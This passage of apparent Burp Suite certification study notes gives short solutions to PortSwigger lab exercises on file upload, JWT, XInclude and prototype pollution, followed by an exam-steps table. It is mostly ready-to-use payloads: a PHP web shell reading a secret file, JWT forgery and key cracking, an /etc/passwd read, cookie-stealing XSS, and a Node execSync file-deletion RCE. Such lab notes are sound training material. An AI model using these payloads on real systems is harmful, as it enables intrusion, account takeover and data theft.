#### UPLD.06 - Remote code execution via polyglot web shell upload

```
Content-Disposition: form-data; name="avatar"; filename="test.php"
Content-Type: text/php

<--JPG MAGIC NUMBER-->

<?php echo file_get_contents('/home/carlos/secret'); ?>
```



## <a name="23"></a>23 - JWT

#### JWT.01 - JWT authentication bypass via unverified signature

Change the username to administrator.


#### JWT.02 - JWT authentication bypass via flawed signature verification

Set the "alg" to "none" and delete the signature (everything after the second “.” character).


#### JWT.03 - JWT authentication bypass via weak signing key

Crack the JWT key and forge a new one for user "administrator":

```
hashcat -a 0 -m 16500 "eyJraWQiOiJiNzU4ZDZjOC01NTIzLTQ0YmQtOTgzYS1iMDlhZDA0YjBmOTciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4Mzc5MDMwNX0.ltkivPFm-8ecty4-ipdJS2BtN5aBoTxDQD7tYE2kujo" jwt.secrets.list
```


#### JWT.04 - JWT authentication bypass via jwk header injection

In “JWT Editor Keys”, generate a RSA key. In Repeater, in the “JSON Web Token” tab, click “Attack” and “Embedded JWK”. 


#### JWT.05 - JWT authentication bypass via jku header injection

Create “/jwks.json” in the exploit server:

```
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "36dbda36-552c-438b-ac4c-9e365fb78ec5",
            "n": "zdCdoh120Xnv9C_UywxJX78dtqOyMS42cXfmnjTYEuShgMd4yABQeUuObibikuytdaopdW0PtY1Q2AYOg0H6A4iBbTzRHNaN85IOb5J7mgiHHp7oIjDlQ6wajZsraj3US4hX3TdK3gcEG-h0EWpSh9A34yfq3HCKLdEVbV0XgRmI3N6Nc_VX5aIcGkoALHZBd9g179CfBtvtUu3cFPZA8eC9iv5xv1AyO4IdlOVdKjNernPu94LzzyYlHObHHWj-BaC5Px4J0jDymdPc9HaLm67nlA0aqZ6KA4HwzZHGJEb2UO_-Ya1HCsRhrnz2e2QRPVAOHgQkPWMKJb6vOFU5OQ"
        }
    ]
}
```

Create the JWT with this header:

```
{
  "kid": "36dbda36-552c-438b-ac4c-9e365fb78ec5",
  "alg": "RS256",
  "jku": "https://exploit-0a3700d5034894e7808139f701b000a7.exploit-server.net/jwks.json"
}
```

#### JWT.06 - JWT authentication bypass via kid header path traversal

Create a JWT with this header and no secret in jwt.io:

```
{
  "kid": "../../../dev/null",
  "alg": "HS256"
}
```


## <a name="24"></a>24 - Essential skills

#### ESSE.01 - Discovering vulnerabilities quickly with targeted scanning

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

```
POST /product/stock HTTP/2
...

productId=%3c%66%6f%6f%20%78%6d%6c%6e%73%3a%78%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%49%6e%63%6c%75%64%65%22%3e%3c%78%69%3a%69%6e%63%6c%75%64%65%20%70%61%72%73%65%3d%22%74%65%78%74%22%20%68%72%65%66%3d%22%66%69%6c%65%3a%2f%2f%2f%65%74%63%2f%70%61%73%73%77%64%22%2f%3e%3c%2f%66%6f%6f%3e&storeId=1
```


## <a name="25"></a>25 - Prototype pollution


#### PROPO.01 - DOM XSS via client-side prototype pollution

```
/?__proto__[transport_url]=data:,alert(1);
```


#### PROPO.02 - DOM XSS via an alternative prototype pollution vector

```
/?search=aaa&__proto__.sequence=alert(1)-
```


#### PROPO.03 - Client-side prototype pollution via flawed sanitization

```
/?__pro__proto__to__[transport_url]=data:,alert(1);
```


#### PROPO.04 - Client-side prototype pollution in third-party libraries

```
<script>
    location="https://0a65003104a4a2b382ec47a700530010.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29"
</script>
```


#### PROPO.05 - Client-side prototype pollution via browser APIs

```
/?__proto__[value]=data:,alert(1)
```


#### PROPO.06 - Privilege escalation via server-side prototype pollution

```
POST /my-account/change-address HTTP/2
...

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"e6Z5ouDA9AodwILfR7nGgH2nYPtPLzyE","__proto__":{        "isAdmin":true    }}
```


#### PROPO.07 - Detecting server-side prototype pollution without polluted property reflection

```
POST /my-account/change-address HTTP/2
...

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"+AGYAbwBv-","sessionId":"GBF3M0MGldLBwDhhruxk8a4GKGNX5ju0","__proto__":{"content-type": "application/json; charset=utf-7"}}
```

```
POST /my-account/change-address HTTP/2
...

{"address_line_1":"+AGYAbwBv-","address_line_2":"+AGYAbwBv-","city":"+AGYAbwBv-","postcode":"+AGYAbwBv-","country":"+AGYAbwBv-","sessionId":"GBF3M0MGldLBwDhhruxk8a4GKGNX5ju0"}
```


#### PROPO.08 - Bypassing flawed input filters for server-side prototype pollution

```
POST /my-account/change-address HTTP/2
...

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UKKKKKK","sessionId":"PDKi3aQnLAV0M8OWcB6qLExhgub4zcGW","constructor":{"prototype":{"isAdmin":true}}}
```


#### PROPO.09 - Remote code execution via server-side prototype pollution

```
POST /my-account/change-address HTTP/2

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"9w2wz2qtX8He4ofWjxuo5Lv3cGj49UjN","__proto__": {  "shell":"",    "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\"child_process\").execSync(\"rm /home/carlos/morale.txt\").toString())//"}}

```

## <a name="26"></a>Exam steps

Source: [https://micahvandeusen.com/burp-suite-certified-practitioner-exam-review/](https://micahvandeusen.com/burp-suite-certified-practitioner-exam-review/)

| Vulnerability         | S1    | S2    | S3    |
|:---------------------:|:-----:|:-----:|:-----:|
| SQL Injection | | :heavy_check_mark: | :heavy_check_mark: |
| Cross-site scripting | :heavy_check_mark: | :heavy_check_mark: | | 
| Cross-site request forgery (CSRF) | :heavy_check_mark: | :heavy_check_mark: | |
| Clickjacking | :heavy_check_mark: | :heavy_check_mark: | |
| DOM-based vulnerabilities | :heavy_check_mark: | :heavy_check_mark: | |
| Cross-origin resource sharing (CORS) | :heavy_check_mark: | :heavy_check_mark: | |
| XML external entity (XXE) injection | | | :heavy_check_mark: |
| Server-side request forgery (SSRF) | | | :heavy_check_mark: |
| HTTP request smuggling | :heavy_check_mark: | :heavy_check_mark: | |
| OS command injection | | | :heavy_check_mark: |
| Server-side template injection | | | :heavy_check_mark: |
| Directory traversal | | | :heavy_check_mark: |
| Access control vulnerabilities | :heavy_check_mark: | :heavy_check_mark: | |
| Authentication | :heavy_check_mark: | :heavy_check_mark: | |
| Web cache poisoning | :heavy_check_mark: | :heavy_check_mark: | |
| Insecure deserialization | | | :heavy_check_mark: |
| HTTP Host header attacks | :heavy_check_mark: | :heavy_check_mark: | |
| OAuth authentication | :heavy_check_mark: | :heavy_check_mark: | |
| File upload vulnerabilities | | | :heavy_check_mark: | 
| JWT | :heavy_check_mark: | :heavy_check_mark: | |

Step 1:
- Cross-site scripting
- Cross-site request forgery (CSRF)
- Clickjacking
- DOM-based vulnerabilities
- Cross-origin resource sharing (CORS)
- HTTP request smuggling
- Access control vulnerabilities
- Authentication
- Web cache poisoning
- HTTP Host header attacks
- OAuth authentication
- JWT

Step 2:
- SQL Injection
- Cross-site scripting
- Cross-site request forgery (CSRF)
- Clickjacking
- DOM-based vulnerabilities
- Cross-origin resource sharing (CORS)
- HTTP request smuggling
- Access control vulnerabilities
- Authentication
- Web cache poisoning
- HTTP Host header attacks
- OAuth authentication
- JWT

Step 3:
- SQL Injection
- XML external entity (XXE) injection
- Server-side request forgery (SSRF)
- OS command injection
- Server-side template injection
- Directory traversal
- Insecure deserialization
- File upload vulnerabilities
